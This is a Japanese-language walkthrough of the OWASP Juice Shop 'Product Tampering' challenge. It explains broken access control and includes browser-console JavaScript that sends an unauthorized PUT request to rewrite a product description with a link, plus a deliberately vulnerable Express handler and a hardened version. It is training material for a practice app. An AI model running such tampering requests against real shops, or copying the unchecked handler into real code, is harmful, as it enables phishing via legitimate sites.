# Product Tampering ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** Broken Access Control / データ改ざん
**目標:** 商品説明のリンク先を改ざんする

---

## 背景知識

### Broken Access Control（アクセス制御の不備）とは

ユーザーが**本来許可されていない操作**を実行できてしまう脆弱性。この場合、一般ユーザーが商品データを変更できてしまう。

```
┌─────────────────────────────────────────────────────────────────┐
│                     アクセス制御の階層                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【正しいアクセス制御】                                          │
│                                                                 │
│  ユーザー種別        許可される操作                              │
│  ─────────────      ────────────────────                        │
│  一般ユーザー   →   商品の閲覧、購入のみ                         │
│  スタッフ       →   在庫管理、注文処理                          │
│  管理者         →   商品データの編集、ユーザー管理               │
│                                                                 │
│  【脆弱なアクセス制御】(このチャレンジ)                           │
│                                                                 │
│  一般ユーザー   →   商品の閲覧、購入                             │
│                 →   商品データの編集も可能！ 😱                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

スーパーマーケットを想像してください:

- **正しい仕組み**: 商品の価格タグは店員だけが変更できる
- **脆弱な仕組み**: 誰でも商品棚にある価格タグを書き換えられる

このチャレンジでは、「商品説明のリンク」という価格タグを誰でも書き換えられてしまう。

### なぜこれが危険か

商品ページの改ざんは、**正規サイトを利用したフィッシング攻撃**につながる:

```
┌─────────────────────────────────────────────────────────────────┐
│                     攻撃シナリオ                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 攻撃者が商品説明を改ざん                                     │
│     └→ "詳細はこちら" リンクを偽サイトに変更                     │
│                                                                 │
│  2. 被害者が正規のショッピングサイトにアクセス                    │
│     └→ 「このサイトは信頼できる」と思っている                    │
│                                                                 │
│  3. 商品ページで "詳細はこちら" をクリック                       │
│     └→ 偽サイトに誘導される                                     │
│                                                                 │
│  4. 偽サイトで情報を入力                                         │
│     └→ クレジットカード情報、ログイン情報を窃取                  │
│                                                                 │
│  ポイント: 正規サイト上のリンクなので、被害者は疑わない           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 思考プロセス

### ステップ1: APIの構造を調査

```
「商品一覧の取得方法を確認」
    ↓
「GET /api/Products で商品リストを取得」
    ↓
「各商品には id, name, description などがある」
    ↓
「PUT /api/Products/{id} で更新できるかも？」
```

### ステップ2: 権限チェックの有無を確認

```
「一般ユーザーでログイン」
    ↓
「PUT /api/Products/1 を試す」
    ↓
「エラーになるか、成功するか？」
    ↓
「成功した！権限チェックがない」
```

### ステップ3: 攻撃対象を選定

```
「どの商品を改ざんする？」
    ↓
「O-Saft (ID: 9) には元々リンクがある」
    ↓
「リンク先を改ざんしてチャレンジをクリア」
```

### ステップ4: ペイロードを作成

```
「description フィールドに悪意あるリンクを挿入」
    ↓
「<a href="https://owasp.slack.com">More...</a>」
    ↓
「ユーザーがクリックすると外部サイトに誘導される」
```

---

## 実行手順

### Step 1: 商品データを確認

```javascript
// Console で実行
const products = await fetch('/api/Products').then(r => r.json());
console.log(products.data.find(p => p.name.includes('O-Saft')));
// → { id: 9, name: "OWASP SSL Advanced Forensic Tool (O-Saft)", description: "..." }
```

### Step 2: 現在の description を確認

```javascript
const product = await fetch('/api/Products/9').then(r => r.json());
console.log(product.data.description);
// → "O-Saft is an easy to use tool to show information about SSL certificates and tests the SSL connection..."
```

### Step 3: 改ざんしたリンクを含む description を送信

```javascript
const result = await fetch('/api/Products/9', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    description: 'O-Saft is an easy to use tool to show information about SSL certificates and tests the SSL connection according given list of ciphers and various SSL configurations. <a href="https://owasp.slack.com" target="_blank">More...</a>'
  })
}).then(r => r.json());

console.log('Result:', result);
```

### Step 4: 結果を確認

商品ページにアクセスすると、「More...」リンクが `https://owasp.slack.com` に変わっている。

---

## 脆弱なAPIのパターン

```javascript
// ❌ 脆弱なコード
app.put('/api/Products/:id', async (req, res) => {
  const productId = req.params.id;
  const updates = req.body;

  // 認証チェックなし、または権限チェックなし
  await Product.update(updates, {
    where: { id: productId }
  });

  res.json({ status: 'success' });
});
```

### 問題点

1. **認証チェックなし**: ログインしていなくても更新可能
2. **権限チェックなし**: 管理者でなくても更新可能
3. **フィールド制限なし**: どのフィールドでも更新可能

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.put('/api/Products/:id',
  authenticate,  // 認証ミドルウェア
  authorize(['admin', 'product_manager']),  // 権限チェック
  async (req, res) => {
    const productId = req.params.id;

    // 許可されたフィールドのみ更新（ホワイトリスト）
    const allowedFields = ['name', 'description', 'price', 'image'];
    const updates = {};
    for (const field of allowedFields) {
      if (req.body[field] !== undefined) {
        updates[field] = req.body[field];
      }
    }

    // 危険なHTMLをサニタイズ
    if (updates.description) {
      updates.description = sanitizeHtml(updates.description, {
        allowedTags: ['b', 'i', 'em', 'strong'],
        allowedAttributes: {}  // リンクは許可しない
      });
    }

    // 監査ログを記録
    logger.info('Product updated', {
      productId,
      updatedBy: req.user.id,
      changes: updates
    });

    await Product.update(updates, { where: { id: productId } });
    res.json({ status: 'success' });
  }
);
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **認証 (Authentication)** | ログイン済みか確認 |
| **認可 (Authorization)** | 適切な権限があるか確認 |
| **ホワイトリスト** | 更新可能なフィールドを制限 |
| **サニタイズ** | 危険なHTML（リンク等）を除去 |
| **監査ログ** | 誰が何を変更したか記録 |

---

## 実世界での類似事例

### EC サイトの商品改ざん

- 価格を勝手に変更されて安売りされる
- 説明文にフィッシングリンクを挿入
- 在庫数を改ざんして品切れを偽装

### Wiki/CMS の改ざん

- 正しい情報を誤情報に書き換え
- マルウェア配布サイトへのリンクを追加
- SEO スパムの挿入

### サプライチェーン攻撃

- ソフトウェアの公式ダウンロードリンクを改ざん
- 正規サイトから悪意あるソフトウェアを配布

---

## HTTP メソッドの理解

| メソッド | 用途 | 例 |
|---------|------|-----|
| GET | データの取得（読み取り専用） | `GET /api/Products` |
| POST | 新規データの作成 | `POST /api/Products` |
| PUT | データの更新（全体置換） | `PUT /api/Products/9` |
| PATCH | データの部分更新 | `PATCH /api/Products/9` |
| DELETE | データの削除 | `DELETE /api/Products/9` |

PUT や PATCH は**変更を伴う**ため、特に厳重な権限チェックが必要。

---

## 関連チャレンジ

- [Admin Registration](admin-registration.md) - Mass Assignment で権限昇格
- [View Basket](../difficulty-2/view-basket.md) - 他人のデータを閲覧
- [Forged Feedback](forged-feedback.md) - 他人としてデータを作成

## 参考リンク

- [OWASP - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
